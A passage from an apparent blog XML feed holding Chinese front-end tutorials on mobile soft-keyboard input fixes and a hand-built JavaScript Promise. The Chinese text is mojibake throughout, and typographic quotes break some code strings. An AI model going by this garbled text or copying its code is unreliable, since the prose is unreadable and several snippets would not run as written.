é”®ç›˜æ”¶èµ·å•¦ï¼');// IOS é”®ç›˜æ”¶èµ·åŽæ“ä½œ// å¾®ä¿¡æµè§ˆå™¨ç‰ˆæœ¬6.7.4+IOS12ä¼šå‡ºçŽ°é”®ç›˜æ”¶èµ·åŽï¼Œè§†å›¾è¢«é¡¶ä¸ŠåŽ»äº†æ²¡æœ‰ä¸‹æ¥var wechatInfo = window.navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);if (!wechatInfo) return;var wechatVersion = wechatInfo[1];var version = (navigator.appVersion).match(/OS (\d+)_(\d+)_?(\d+)?/);if (+wechatVersion.replace(/\./g, '') &gt;= 674 &amp;&amp; +version[1] &gt;= 12) &#123; setTimeout(function () &#123; window.scrollTo(0, Math.max(document.body.clientHeight, document.documentElement.clientHeight)); &#125;)&#125; å…¼å®¹ç¬¬ä¸‰æ–¹è¾“å…¥æ³•ä¸Šé¢è¯´äº†é‚£ä¹ˆå¤šï¼Œå…¶å®žå·²ç»æŠŠ H5 èŠå¤©è¾“å…¥æ¡†çš„å‘å¡«äº†ä¸€å¤§åŠäº†ï¼ŒæŽ¥ä¸‹æ¥å°±å…ˆçœ‹ä¸‹èŠå¤©è¾“å…¥æ¡†çš„åŸºæœ¬HTMLç»“æž„ 12345678910&lt;div class="chat__content"&gt; &lt;div&gt; &lt;p&gt;ä¸€äº›èŠå¤©å†…å®¹1&lt;/p&gt; &lt;/div&gt; &lt;!-- çœç•¥å‡ åƒè¡ŒèŠå¤©å†…å®¹ --&gt;&lt;/div&gt;&lt;div class="input__content"&gt; &lt;div class="input" contenteditable="true"&gt;&lt;/div&gt; &lt;button&gt;å‘é€&lt;/button&gt;&lt;/div&gt; æ ·å¼ 123456789101112131415161718/* çœç•¥ä¸€äº›æ ·å¼ */.chat__content &#123; height: calc(100% - 40px); margin-bottom: 40px; overflow-y: auto; overflow-x: hidden;&#125;.input__content &#123; display: flex; height: 40px; position: absolute; left: 0; right: 0; bottom: 0; align-items: center;&#125;/* çœç•¥ä¸€äº›æ ·å¼ */ å¾ˆç®€å•ï¼Œå°±æ˜¯åˆ’åˆ†å†…å®¹åŒºå’Œè¾“å…¥åŒºï¼Œè¾“å…¥åŒºæ˜¯ç»å¯¹å®šä½ï¼ŒæŒ‰ç…§ä¸Šé¢è¡¨å•è¾“å…¥ demo çš„åšæ³•ï¼Œç¡®å®žå¤§éƒ¨åˆ† Android æµè§ˆå™¨æ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†æ˜¯æµ‹è¯•åœ¨ IOS ä¸Šï¼ŒUC æµè§ˆå™¨é…åˆåŽŸç”Ÿè¾“å…¥æ³•å’Œç¬¬ä¸‰æ–¹è¾“å…¥æ³•ï¼ˆæ¯”å¦‚æœç‹—è¾“å…¥æ³•ï¼‰ï¼Œè¾“å…¥æ¡†éƒ½ä¼šè¢«å®Œå…¨æŒ¡ä½ï¼›QQ æµè§ˆå™¨æˆ–å¾®ä¿¡æµè§ˆå™¨ï¼Œé…åˆç¬¬ä¸‰æ–¹è¾“å…¥æ³•ï¼Œè¾“å…¥æ¡†ä¼šè¢«é®ä½ä¸€åŠï¼›ç™¾åº¦æµè§ˆå™¨é…åˆç¬¬ä¸‰æ–¹è¾“å…¥æ³•è¾“å…¥æ¡†ä¹Ÿä¼šè¢«å®Œå…¨é®ä½ã€‚æŸ¥çœ‹æ•ˆæžœå¯ä»¥ç”¨ç›¸åº”æµè§ˆå™¨ä¸­è®¿é—®è¿™é‡Œã€‚ åœ¨ UC æµè§ˆå™¨ä¸Šï¼Œè½¯é”®ç›˜å¼¹èµ·åŽï¼Œæµè§ˆå™¨ä¸Šé¢çš„æ ‡é¢˜æ é«˜åº¦å°±æœ‰ä¸ªé«˜åº¦å˜å°å»¶æ—¶åŠ¨æ€æ•ˆæžœï¼Œè¿™æ ·å¯¼è‡´ webview å¾€ä¸‹æ»šäº†ä¸€ç‚¹ï¼Œåº•éƒ¨è¾“å…¥æ¡†æ»šåˆ°äº†éžå¯è§†åŒºã€‚è€Œå¯¹äºŽç¬¬ä¸‰æ–¹è¾“å…¥æ³•ï¼ŒçŒœæµ‹æœ¬èº«æ˜¯ç”±äºŽè¾“å…¥æ³•é¢æ¿å¼¹èµ·åŽé«˜åº¦è®¡ç®—æœ‰è¯¯ï¼Œå¯¼è‡´ webview åˆå§‹æ»šåŠ¨å®šä½æœ‰è¯¯ã€‚å…¶å®žè¿™ä¸¤ç‚¹éƒ½æ˜¯ webview æ»šåŠ¨ä¸åˆ°ä½é€ æˆçš„ã€‚å¯ä»¥è®©è½¯é”®ç›˜å¼¹èµ·åŽï¼Œè®©ç„¦ç‚¹å…ƒç´ å†æ¬¡æ»šåˆ°å¯è§†åŒºï¼Œå¼ºè¿« webview æ»šåˆ°ä½ã€‚ 123console.log('Android é”®ç›˜å¼¹èµ·å•¦ï¼');// Android é”®ç›˜å¼¹èµ·åŽæ“ä½œactiveElementScrollIntoView($input, 1000); å…¼å®¹ Android å°ç±³æµè§ˆå™¨çš„ Hack æ–¹æ¡ˆåœ¨ Android çš„å°ç±³æµè§ˆå™¨ä¸Šï¼Œåº”ç”¨ä¸Šé¢çš„æ–¹æ¡ˆï¼Œå‘çŽ°èŠå¤©è¾“å…¥æ¡†è¿˜æ˜¯è¢«é®æŒ¡å¾—ä¸¥ä¸¥å®žå®žï¼ŒscrollIntoView() ä»ç„¶çº¹ä¸ä¸åŠ¨ã€‚æ‰€ä»¥çŒœæµ‹ï¼Œå…¶å®žæ˜¯æ»šåˆ°åº•äº†ï¼Œè½¯é”®ç›˜å¼¹èµ·ï¼Œé¡µé¢å®žçŽ°é«˜åº¦å¤§äºŽå¯è§†åŒºé«˜åº¦ï¼Œè¿™æ ·åªèƒ½åœ¨è½¯é”®ç›˜å¼¹èµ·åŽï¼Œå¼ºè¡Œå¢žåŠ é¡µé¢é«˜åº¦ï¼Œä½¿è¾“å…¥æ¡†å¯ä»¥æ˜¾ç¤ºå‡ºæ¥ã€‚ç»¼åˆä¸Šé¢å…¼å®¹ç¬¬ä¸‰æ–¹è¾“å…¥æ³•ï¼ŒæŸ¥çœ‹æ•ˆæžœå¯ä»¥æˆ³è¿™é‡Œ 1234567891011121314151617181920212223242526// Andriod é”®ç›˜æ”¶èµ·ï¼šAndriod é”®ç›˜å¼¹èµ·æˆ–æ”¶èµ·é¡µé¢é«˜åº¦ä¼šå‘ç”Ÿå˜åŒ–ï¼Œä»¥æ­¤ä¸ºä¾æ®èŽ·çŸ¥é”®ç›˜æ”¶èµ·if (judgeDeviceType.isAndroid) &#123; var originHeight = document.documentElement.clientHeight || document.body.clientHeight; window.addEventListener('resize', function () &#123; var resizeHeight = document.documentElement.clientHeight || document.body.clientHeight; if (originHeight &lt; resizeHeight) &#123; console.log('Android é”®ç›˜æ”¶èµ·å•¦ï¼'); // Android é”®ç›˜æ”¶èµ·åŽæ“ä½œ // ä¿®å¤å°ç±³æµè§ˆå™¨ä¸‹ï¼Œè¾“å…¥æ¡†ä¾æ—§è¢«è¾“å…¥æ³•é®æŒ¡é—®é¢˜ if (judgeDeviceType.isMiuiBrowser) &#123; document.body.style.marginBottom = '0px'; &#125; &#125; else &#123; console.log('Android é”®ç›˜å¼¹èµ·å•¦ï¼'); // Android é”®ç›˜å¼¹èµ·åŽæ“ä½œ // ä¿®å¤å°ç±³æµè§ˆå™¨ä¸‹ï¼Œè¾“å…¥æ¡†ä¾æ—§è¢«è¾“å…¥æ³•é®æŒ¡é—®é¢˜ if (judgeDeviceType.isMiuiBrowser) &#123; document.body.style.marginBottom = '40px'; &#125; activeElementScrollIntoView($input, 1000); &#125; originHeight = resizeHeight; &#125;, false)&#125; æ€»ç»“H5 ç«¯å‰è·¯æ¼«æ¼«ï¼Œå‘å¾ˆå¤šï¼Œéœ€è¦ä¸æ–­å°è¯•ã€‚äº†è§£è½¯é”®ç›˜å¼¹èµ·é¡µé¢åœ¨ IOS å’Œ Android ä¸Šçš„è¡¨çŽ°å·®å¼‚æ˜¯å‰æï¼Œå…¶æ¬¡æ˜¯å°†ç„¦ç‚¹å…ƒç´ æ»šåŠ¨åˆ°å¯è§†åŒºï¼ŒåŒæ—¶è¦è€ƒè™‘åˆ°ç¬¬ä¸‰æ–¹è¾“å…¥æ³•å’ŒæŸäº›æµè§ˆå™¨ä¸Šçš„å·®åˆ«ã€‚æ€»ç»“è‚¯å®šä¸å…¨é¢ï¼Œæ¬¢è¿Žå¤§å®¶æŒ‡æ­£å“ˆï¼Œå®Œ~]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Promiseçš„å®žçŽ°]]></title>
    <url>%2F2019%2F02%2F18%2Frealize-promise%2F</url>
    <content type="text"><![CDATA[ç”¨è¿‡ Promiseï¼Œä½†æ˜¯æ€»æ˜¯æœ‰ç‚¹ä¼¼æ‡‚éžæ‡‚çš„æ„Ÿè§‰ï¼Œä¹Ÿçœ‹è¿‡å¾ˆå¤šæ–‡ç« ï¼Œè¿˜æ˜¯æžä¸æ‡‚ Promiseçš„ å®žçŽ°åŽŸç†ï¼ŒåŽé¢è‡ªå·±è¾¹çœ‹æ–‡ç« ï¼Œè¾¹è°ƒè¯•ä»£ç ï¼Œç»ˆäºŽæ…¢æ…¢çš„æœ‰æ„Ÿè§‰äº†ï¼Œä¸‹é¢å°±æŒ‰è‡ªå·±çš„ç†è§£æ¥å®žçŽ°ä¸€ä¸ª Promiseã€‚ å·²å°†æ¯ä¸€æ­¥çš„ä»£ç éƒ½æ”¾åœ¨äº† github ä¸Šï¼Œæ–¹ä¾¿å¤§å®¶é˜…è¯»ã€‚å¦‚æžœè§‰å¾—å¥½çš„è¯ï¼Œæ¬¢è¿Žstarã€‚ æƒ³è¦å®Œå…¨ç†è§£ä»£ç ï¼Œéœ€è¦ç†è§£ this å’Œé—­åŒ…çš„å«ä¹‰ã€‚ Promiseæ˜¯ä»€ä¹ˆç®€å•æ¥è¯´ï¼ŒPromise ä¸»è¦å°±æ˜¯ä¸ºäº†è§£å†³å¼‚æ­¥å›žè°ƒçš„é—®é¢˜ã€‚ç”¨ Promise æ¥å¤„ç†å¼‚æ­¥å›žè°ƒä½¿å¾—ä»£ç å±‚æ¬¡æ¸…æ™°ï¼Œä¾¿äºŽç†è§£ï¼Œä¸”æ›´åŠ å®¹æ˜“ç»´æŠ¤ã€‚å…¶ä¸»æµè§„èŒƒç›®å‰ä¸»è¦æ˜¯ Promises/A+ ã€‚å¯¹äºŽ Promise ç”¨æ³•ä¸ç†Ÿæ‚‰çš„ï¼Œå¯ä»¥å‚çœ‹æˆ‘çš„è¿™ç¯‡æ–‡ç« â€”â€”es6å­¦ä¹ ç¬”è®°5â€“promiseï¼Œç†è§£äº†å†æ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼Œä¼šå¯¹ä½ æœ‰å¾ˆå¤§å¸®åŠ©çš„ã€‚ åœ¨å¼€å§‹å‰ï¼Œæˆ‘ä»¬å…ˆå†™ä¸€ä¸ª promise åº”ç”¨åœºæ™¯æ¥ä½“ä¼šä¸‹ promise çš„ä½œç”¨ã€‚ç›®å‰è°·æ­Œå’Œç«ç‹å·²ç»æ”¯æŒ es6 çš„ promiseã€‚æˆ‘ä»¬é‡‡ç”¨ setTimeout æ¥æ¨¡æ‹Ÿå¼‚æ­¥çš„è¿è¡Œï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š å¤åˆ¶ä»£ç function fn1(resolve, reject) { setTimeout(function() { console.log(â€˜æ­¥éª¤ä¸€ï¼šæ‰§è¡Œâ€™); resolve(â€˜1â€™); },500);} function fn2(resolve, reject) { setTimeout(function() { console.log(â€˜æ­¥éª¤äºŒï¼šæ‰§è¡Œâ€™); resolve(â€˜2â€™); },100);} new Promise(fn1).then(function(val){ console.log(val); return new Promise(fn2);}).then(function(val){ console.log(val); return 33;}).then(function(val){ console.log(val);});å¤åˆ¶ä»£ç æœ€ç»ˆæˆ‘ä»¬å†™çš„promiseåŒæ ·å¯ä»¥å®žçŽ°è¿™ä¸ªåŠŸèƒ½ã€‚ åˆæ­¥æž„å»ºä¸‹é¢æˆ‘ä»¬æ¥å†™ä¸€ä¸ªç®€å•çš„ promsieã€‚Promise çš„å‚æ•°æ˜¯å‡½æ•° fnï¼ŒæŠŠå†…éƒ¨å®šä¹‰ resolve æ–¹æ³•ä½œä¸ºå‚æ•°ä¼ åˆ° fn ä¸­ï¼Œè°ƒç”¨ fnã€‚å½“å¼‚æ­¥æ“ä½œæˆåŠŸåŽä¼šè°ƒç”¨ resolve æ–¹æ³•ï¼Œç„¶åŽå°±ä¼šæ‰§è¡Œ then ä¸­æ³¨å†Œçš„å›žè°ƒå‡½æ•°ã€‚ å¤åˆ¶ä»£ç function Promise(fn){ //éœ€è¦ä¸€ä¸ªæˆåŠŸæ—¶çš„å›žè°ƒ var callback; //ä¸€ä¸ªå®žä¾‹çš„æ–¹æ³•ï¼Œç”¨æ¥æ³¨å†Œå¼‚æ­¥äº‹ä»¶ this.then = function(done){ callback = done; } function resolve(){ callback(); } fn(resolve);}å¤åˆ¶ä»£ç åŠ å…¥é“¾å¼æ”¯æŒä¸‹é¢åŠ å…¥é“¾å¼ï¼ŒæˆåŠŸå›žè°ƒçš„æ–¹æ³•å°±å¾—å˜æˆæ•°ç»„æ‰èƒ½å­˜å‚¨ã€‚åŒæ—¶æˆ‘ä»¬ç»™ resolve æ–¹æ³•æ·»åŠ å‚æ•°ï¼Œè¿™æ ·å°±ä¸ä¼šè¾“å‡º undefinedã€‚ å¤åˆ¶ä»£ç function Promise(fn) { var promise = this, value = null; promise._resolves = []; this.then = function (onFulfilled) { promise._resolves.push(onFulfilled); return this; }; function resolve(value) { promise._resolves.forEach(function (callback) { callback(value); }); } fn(resolve); }å¤åˆ¶ä»£ç promise = thisï¼Œ è¿™æ ·æˆ‘ä»¬ä¸ç”¨æ‹…å¿ƒæŸä¸ªæ—¶åˆ» this æŒ‡å‘çªç„¶æ”¹å˜é—®é¢˜ã€‚ è°ƒç”¨ then æ–¹æ³•ï¼Œå°†å›žè°ƒæ”¾å…¥ promise._resolves é˜Ÿåˆ—ï¼› åˆ›å»º Promise å¯¹è±¡åŒæ—¶ï¼Œè°ƒç”¨å…¶ fn, å¹¶ä¼ å…¥ resolve æ–¹æ³•ï¼Œå½“ fn çš„å¼‚æ­¥æ“ä½œæ‰§è¡ŒæˆåŠŸåŽï¼Œå°±ä¼šè°ƒç”¨ resolve ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œpromise._resolves é˜Ÿåˆ—ä¸­çš„å›žè°ƒï¼› resolve æ–¹æ³• æŽ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œå³å¼‚æ­¥æ“ä½œè¿”å›žçš„ç»“æžœï¼Œæ–¹ä¾¿ä¼ å€¼ã€‚ thenæ–¹æ³•ä¸­çš„ return this å®žçŽ°äº†é“¾å¼è°ƒç”¨ã€‚ä½†æ˜¯ï¼Œç›®å‰çš„ Promise è¿˜å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œå¦‚æžœæˆ‘ä¼ å…¥çš„æ˜¯ä¸€ä¸ªä¸åŒ…å«å¼‚æ­¥æ“ä½œçš„å‡½æ•°ï¼Œresolveå°±ä¼šå…ˆäºŽ then æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ promise._resolves æ˜¯ä¸€ä¸ªç©ºæ•°ç»„ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ resolve ä¸­æ·»åŠ  setTimeoutï¼Œæ¥å°† resolve ä¸­æ‰§è¡Œå›žè°ƒçš„é€»è¾‘æ”¾ç½®åˆ° JS ä»»åŠ¡é˜Ÿåˆ—æœ«å°¾ã€‚ å¤åˆ¶ä»£ç  function resolve(value) { setTimeout(function() { promise._resolves.forEach(function (callback) { callback(value); }); },0); }å¤åˆ¶ä»£ç å¼•å…¥çŠ¶æ€å‰–æž Promise ä¹‹åŸºç¡€ç¯‡ è¯´ è¿™é‡Œå­˜åœ¨ä¸€ç‚¹é—®é¢˜: å¦‚æžœ Promise å¼‚æ­¥æ“ä½œå·²ç»æˆåŠŸï¼Œä¹‹åŽè°ƒç”¨ then æ³¨å†Œçš„å›žè°ƒå†ä¹Ÿä¸ä¼šæ‰§è¡Œäº†ï¼Œè€Œè¿™æ˜¯ä¸ç¬¦åˆæˆ‘ä»¬é¢„æœŸçš„ã€‚ å¯¹äºŽè¿™å¥è¯ä¸æ˜¯å¾ˆç†è§£ï¼Œæœ‰çŸ¥é“çš„å¯ä»¥ç•™è¨€è¯´ä¸‹ï¼Œæœ€å¥½èƒ½ç»™å®žä¾‹è¯´æ˜Žä¸‹ã€‚ä½†æˆ‘ä¸ªäººè§‰å¾—æ˜¯ï¼Œthen ä¸­çš„æ³¨å†Œçš„å›žè°ƒéƒ½ä¼šåœ¨ resolve è¿è¡Œä¹‹å‰å°±æ·»åŠ åˆ°æ•°ç»„å½“ä¸­ï¼Œä¸ä¼šå­˜åœ¨ä¸æ‰§è¡Œçš„æƒ…å†µå•Šã€‚ æŽ¥ç€ä¸Šé¢çš„æ­¥ä¼ï¼Œå¼•å…¥çŠ¶æ€ï¼š å¤åˆ¶ä»£ç function Promise(fn) { var promise = this, value = null; promise._resolves = []; promise._status = â€˜PENDINGâ€™; this.then = function (onFulfilled) { if (promise._status === &apos;PENDING&apos;) { promise._resolves.push(onFulfilled); return this; } onFulfilled(value); return this; }; function resolve(value) { setTimeout(function(){ promise._status = &quot;FULFILLED&quot;; promise._resolves.forEach(function (callback) { callback(value); }) },0); } fn(resolve); }å¤åˆ¶ä»£ç æ¯ä¸ª Promise å­˜åœ¨ä¸‰ä¸ªäº’æ–¥çŠ¶æ€ï¼špendingã€fulfilledã€rejectedã€‚Promise å¯¹è±¡çš„çŠ¶æ€æ”¹å˜ï¼Œåªæœ‰ä¸¤ç§å¯èƒ½ï¼šä»Ž pending å˜ä¸º fulfilled å’Œä»Ž pending å˜ä¸º rejectedã€‚åªè¦è¿™ä¸¤ç§æƒ…å†µå‘ç”Ÿï¼ŒçŠ¶æ€å°±å‡å›ºäº†ï¼Œä¸ä¼šå†å˜äº†ï¼Œä¼šä¸€ç›´ä¿æŒè¿™ä¸ªç»“æžœã€‚å°±ç®—æ”¹å˜å·²ç»å‘ç”Ÿäº†ï¼Œä½ å†å¯¹ Promise å¯¹è±¡æ·»åŠ å›žè°ƒå‡½æ•°ï¼Œä¹Ÿä¼šç«‹å³å¾—åˆ°è¿™ä¸ªç»“æžœã€‚è¿™ä¸Žäº‹ä»¶ï¼ˆEventï¼‰å®Œå…¨ä¸åŒï¼Œäº‹ä»¶çš„ç‰¹ç‚¹æ˜¯ï¼Œå¦‚æžœä½ é”™è¿‡äº†å®ƒï¼Œå†åŽ»ç›‘å¬ï¼Œæ˜¯å¾—ä¸åˆ°ç»“æžœçš„ã€‚ åŠ ä¸Šå¼‚æ­¥ç»“æžœçš„ä¼ é€’ç›®å‰çš„å†™æ³•éƒ½æ²¡æœ‰è€ƒè™‘å¼‚æ­¥è¿”å›žçš„ç»“æžœçš„ä¼ é€’ï¼Œæˆ‘ä»¬æ¥åŠ ä¸Šç»“æžœçš„ä¼ é€’ï¼š å¤åˆ¶ä»£ç  function resolve(value) { setTimeout(function(){ promise._status = â€œFULFILLEDâ€; promise._resolves.forEach(function (callback) { value = callback(value); }) },0); }å¤åˆ¶ä»£ç ä¸²è¡Œ Promiseä¸²è¡Œ Promise æ˜¯æŒ‡åœ¨å½“å‰ promise è¾¾åˆ° fulfilled çŠ¶æ€åŽï¼Œå³å¼€å§‹è¿›è¡Œä¸‹ä¸€ä¸ª promiseï¼ˆåŽé‚» promiseï¼‰ã€‚ä¾‹å¦‚æˆ‘ä»¬å…ˆç”¨ajaxä»ŽåŽå°èŽ·å–ç”¨æˆ·çš„çš„æ•°æ®ï¼Œå†æ ¹æ®è¯¥æ•°æ®åŽ»èŽ·å–å…¶ä»–æ•°æ®ã€‚ è¿™é‡Œæˆ‘ä»¬ä¸»è¦å¯¹ then æ–¹æ³•è¿›è¡Œæ”¹é€ ï¼š å¤åˆ¶ä»£ç  this.then = function (onFulfilled) { return new Promise(function(resolve) { function handle(value) { var ret = isFunction(onFulfilled) &amp;&amp; onFulfilled(value) || value; resolve(ret); } if (promise._status === â€˜PENDINGâ€™) { promise._resolves.push(handle); } else if(promise._status === FULFILLED){ handle(value); } }) }; å¤åˆ¶ä»£ç then æ–¹æ³•è¯¥æ”¹å˜æ¯”è¾ƒå¤šå•Šï¼Œè¿™é‡Œæˆ‘è§£é‡Šä¸‹ï¼š æ³¨æ„çš„æ˜¯ï¼Œnew Promise() ä¸­åŒ¿åå‡½æ•°ä¸­çš„ promise ï¼ˆpromise._resolves ä¸­çš„ promiseï¼‰æŒ‡å‘çš„éƒ½æ˜¯ä¸Šä¸€ä¸ª promise å¯¹è±¡ï¼Œ è€Œä¸æ˜¯å½“å‰è¿™ä¸ªåˆšåˆšåˆ›å»ºçš„ã€‚ é¦–å…ˆæˆ‘ä»¬è¿”å›žçš„æ˜¯æ–°çš„ä¸€ä¸ªpromiseå¯¹è±¡ï¼Œå› ä¸ºæ˜¯åŒç±»åž‹ï¼Œæ‰€ä»¥é“¾å¼ä»ç„¶å¯ä»¥å®žçŽ°ã€‚ å…¶æ¬¡ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ª handle å‡½æ•°ï¼Œhandle å‡½æ•°å¯¹ä¸Šä¸€ä¸ª promise çš„ then ä¸­å›žè°ƒè¿›è¡Œäº†å¤„ç†ï¼Œå¹¶ä¸”è°ƒç”¨äº†å½“å‰çš„ promise ä¸­çš„ resolve æ–¹æ³•ã€‚ æŽ¥ç€å°† handle å‡½æ•°æ·»åŠ åˆ° ä¸Šä¸€ä¸ªpromise çš„ promise._resolves ä¸­ï¼Œå½“å¼‚æ­¥æ“ä½œæˆåŠŸåŽå°±ä¼šæ‰§è¡Œ handle å‡½æ•°ï¼Œè¿™æ ·å°±å¯ä»¥ æ‰§è¡Œ å½“å‰ promise å¯¹è±¡çš„å›žè°ƒæ–¹æ³•ã€‚æˆ‘ä»¬çš„ç›®çš„å°±è¾¾åˆ°äº†ã€‚ æœ‰äº›äººåœ¨è¿™é‡Œå¯èƒ½ä¼šæœ‰ç‚¹çŠ¯æ™•ï¼Œæœ‰å¿…è¦å¯¹æ‰§è¡Œè¿‡ç¨‹åˆ†æžä¸€ä¸‹ï¼Œå…·ä½“å‚çœ‹ä»¥ä¸‹ä»£ç ï¼š new Promise(fn1).then(fn2).then(fn3)})fn1, fn2, fn3çš„å‡½æ•°å…·ä½“å¯å‚çœ‹æœ€å‰é¢çš„å®šä¹‰ã€‚ é¦–å…ˆæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª Promise å®žä¾‹ï¼Œè¿™é‡Œå«åš promise1ï¼›æŽ¥ç€ä¼šè¿è¡Œ fn1(resolve); ä½†æ˜¯ fn1 ä¸­æœ‰ä¸€ä¸ª setTimeout å‡½æ•°ï¼ŒäºŽæ˜¯å°±ä¼šå…ˆè·³è¿‡è¿™ä¸€éƒ¨åˆ†ï¼Œè¿è¡ŒåŽé¢çš„ç¬¬ä¸€ä¸ª then æ–¹æ³•; then è¿”å›žä¸€ä¸ªæ–°çš„å¯¹è±¡ promise2, promise2 å¯¹è±¡çš„ resolve æ–¹æ³•å’Œ then æ–¹æ³•çš„ä¸­å›žè°ƒå‡½æ•° fn2 éƒ½è¢«å°è£…åœ¨ handle ä¸­ï¼Œ ç„¶åŽ handle è¢«æ·»åŠ åˆ° promise1._resolves æ•°ç»„ä¸­ã€‚ æŽ¥ç€è¿è¡Œç¬¬äºŒä¸ª then æ–¹æ³•ï¼ŒåŒæ ·è¿”å›žä¸€ä¸ªæ–°çš„å¯¹è±¡ promise3, åŒ…å« promise3 çš„ resolve æ–¹æ³•å’Œ å›žè°ƒå‡½æ•° fn3 çš„ handle æ–¹æ³•è¢«æ·»åŠ åˆ° promise2._resolves æ•°ç»„ä¸­ã€‚ åˆ°æ­¤ä¸¤ä¸ª then è¿è¡Œç»“æŸã€‚ setTimeout ä¸­çš„å»¶è¿Ÿæ—¶é—´ä¸€åˆ°ï¼Œå°±ä¼šè°ƒç”¨ promise1çš„ resolveæ–¹æ³•ã€‚ resolve æ–¹æ³•çš„æ‰§è¡Œï¼Œä¼šè°ƒç”¨ promise1._resolves æ•°ç»„ä¸­çš„å›žè°ƒï¼Œä¹‹å‰æˆ‘ä»¬æ·»åŠ çš„ handle æ–¹æ³•å°±ä¼šè¢«æ‰§è¡Œï¼› ä¹Ÿå°±æ˜¯ fn2 å’Œ promsie2 çš„ resolve æ–¹æ³•ï¼Œéƒ½è¢«è°ƒç”¨äº†ã€‚ ä»¥æ­¤ç±»æŽ¨ï¼Œfn3 ä¼šå’Œ promise3 çš„ resolve æ–¹æ³• ä¸€èµ·æ‰§è¡Œï¼Œå› ä¸ºåŽé¢æ²¡æœ‰ then æ–¹æ³•äº†ï¼Œpromise3._resolves æ•°ç»„æ˜¯ç©ºçš„ ã€‚ è‡³æ­¤æ‰€æœ‰å›žè°ƒæ‰§è¡Œç»“æŸ ä½†è¿™é‡Œè¿˜å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬çš„ then é‡Œé¢å‡½æ•°ä¸èƒ½å¯¹ Promise å¯¹è±¡è¿›è¡Œå¤„ç†ã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦å†æ¬¡å¯¹ then è¿›è¡Œä¿®æ”¹ï¼Œä½¿å…¶èƒ½å¤Ÿå¤„ç† promise å¯¹è±¡ã€‚ å¤åˆ¶ä»£ç this.then = function (onFulfilled) { return new Promise(function(resolve) { function handle(value) { var ret = typeof onFulfilled === â€˜functionâ€™ &amp;&amp; onFulfilled(value) || value; if( ret &amp;&amp; typeof ret [â€˜thenâ€™] == â€˜functionâ€™){ ret.then(function(value){ resolve(value); }); } else { resolve(ret); } } if (promise._status === â€˜PENDINGâ€™) { promise._resolves.push(handle); } else if(promise._status === FULFILLED){ handle(value); } }) }; å¤åˆ¶ä»£ç åœ¨ then æ–¹æ³•é‡Œé¢ï¼Œæˆ‘ä»¬å¯¹ ret è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æžœæ˜¯ä¸€ä¸ª promise å¯¹è±¡ï¼Œå°±ä¼šè°ƒç”¨å…¶ then æ–¹æ³•ï¼Œå½¢æˆä¸€ä¸ªåµŒå¥—ï¼Œç›´åˆ°å…¶ä¸æ˜¯promiseå¯¹è±¡ä¸ºæ­¢ã€‚åŒæ—¶ åœ¨ then æ–¹æ³•ä¸­æˆ‘ä»¬æ·»åŠ äº†è°ƒç”¨ resolve æ–¹æ³•ï¼Œè¿™æ ·é“¾å¼å¾—ä»¥ç»´æŒã€‚ å¤±è´¥å¤„ç†å¼‚æ­¥æ“ä½œä¸å¯èƒ½éƒ½æˆåŠŸï¼Œåœ¨å¼‚æ­¥æ“ä½œå¤±è´¥æ—¶ï¼Œæ ‡è®°å…¶çŠ¶æ€ä¸º rejectedï¼Œå¹¶æ‰§è¡Œæ³¨å†Œçš„å¤±è´¥å›žè°ƒã€‚ æœ‰äº†ä¹‹å‰å¤„ç† fulfilled çŠ¶æ€çš„ç»éªŒï¼Œæ”¯æŒé”™è¯¯å¤„ç†å˜å¾—å¾ˆå®¹æ˜“ã€‚æ¯«æ— ç–‘é—®çš„æ˜¯ï¼Œåœ¨æ³¨å†Œå›žè°ƒã€å¤„ç†çŠ¶æ€å˜æ›´ä¸Šéƒ½è¦åŠ å…¥æ–°çš„é€»è¾‘ï¼š å¤åˆ¶ä»£ç  this.then = function (onFulfilled, onRejected) { return new Promise(function(resolve, reject) { function handle(value) { â€¦â€¦. } function errback(reason){ reason = isFunction(onRejected) &amp;&amp; onRejected(reason) || reason; reject(reason); } if (promise._status === â€˜PENDINGâ€™) { promise._resolves.push(handle); promise._rejects.push(errback); } else if(promise._status === â€˜FULFILLEDâ€™){ handle(value); } else if(promise._status === â€˜REJECTEDâ€™) { errback(promise._reason); } }) }; function reject(value) { setTimeout(function(){ promise._status = &quot;REJECTED&quot;; promise._rejects.forEach(function (callback) { promise._reason = callback( value); }) },0); } å¤åˆ¶ä»£ç æ·»åŠ Promise.allæ–¹æ³•Promise.all å¯ä»¥æŽ¥æ”¶ä¸€ä¸ªå…ƒç´ ä¸º Promise å¯¹è±¡çš„æ•°ç»„ä½œä¸ºå‚æ•°ï¼Œå½“è¿™ä¸ªæ•°ç»„é‡Œé¢æ‰€æœ‰çš„ Promise å¯¹è±¡éƒ½å˜ä¸º resolve æ—¶ï¼Œè¯¥æ–¹æ³•æ‰ä¼šè¿”å›žã€‚ å…·ä½“ä»£ç å¦‚ä¸‹ï¼š å¤åˆ¶ä»£ç Promise.all = function(promises){ if (!Array.isArray(promises)) { throw new TypeError(â€˜You must pass an array to all.â€™); } // è¿”å›žä¸€ä¸ªpromise å®žä¾‹ return new Promise(function(resolve,reject){ var i = 0, result = [], len = promises.length, count = lenï¼› // æ¯ä¸€ä¸ª promise æ‰§è¡ŒæˆåŠŸåŽï¼Œå°±ä¼šè°ƒç”¨ä¸€æ¬¡ resolve å‡½æ•° function resolver(index) { return function(value) { resolveAll(index, value); }; } function rejecter(reason){ reject(reason); } function resolveAll(index,value){ // å­˜å‚¨æ¯ä¸€ä¸ªpromiseçš„å‚æ•° result[index] = value; // ç­‰äºŽ0 è¡¨æ˜Žæ‰€æœ‰çš„promise 